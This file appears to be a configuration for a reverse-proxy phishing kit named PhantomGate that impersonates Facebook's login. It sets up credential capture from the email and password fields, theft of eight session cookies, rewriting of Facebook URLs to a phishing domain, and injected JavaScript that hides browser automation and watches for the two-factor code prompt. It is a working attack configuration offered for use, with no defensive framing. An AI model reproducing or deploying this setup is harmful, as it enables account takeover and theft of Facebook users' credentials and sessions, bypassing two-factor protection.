name: Facebook
author: PhantomGate
version: 2.0.0
description: Facebook authentication - Pixel-perfect replica

auth:
  domains:
    - facebook.com
    - www.facebook.com
    - m.facebook.com
  
  login:
    domain: www.facebook.com
    path: /login
    username:
      selector: "input#email"
      capture: true
    password:
      selector: "input#pass"
      capture: true
  
  tokens:
    cookies:
      - name: c_user
        regex: ".*"
      - name: xs
        regex: ".*"
      - name: fr
        regex: ".*"
      - name: datr
        regex: ".*"
      - name: sb
        regex: ".*"
      - name: wd
        regex: ".*"
      - name: dpr
        regex: ".*"
      - name: spin
        regex: ".*"

proxy:
  hosts:
    - domain: facebook.com
      inject: true
    - domain: www.facebook.com
      inject: true
    - domain: m.facebook.com
      inject: true
  
  sub_filters:
    - domain: facebook.com
      search: "https://facebook.com"
      replace: "https://{phishing_domain}"
    - domain: www.facebook.com
      search: "https://www.facebook.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    // PhantomGate Injection - Facebook
    (function() {
      'use strict';
      
      // Override navigator properties
      Object.defineProperty(navigator, 'webdriver', {get: () => false});
      
      // Capture form submissions
      document.addEventListener('submit', function(e) {
        var form = e.target;
        var username = form.querySelector('#email');
        var password = form.querySelector('#pass');
        if (username && password) {
          console.log('[PhantomGate] Facebook credentials captured');
        }
      }, true);
      
      // Monitor for 2FA prompt
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.addedNodes.length) {
            var node = mutation.addedNodes[0];
            if (node.nodeType === 1) {
              var otp = node.querySelector('input[name="approvals_code"]');
              if (otp) {
                console.log('[PhantomGate] 2FA prompt detected');
              }
            }
          }
        });
      });
      
      observer.observe(document.body, {childList: true, subtree: true});
    })();
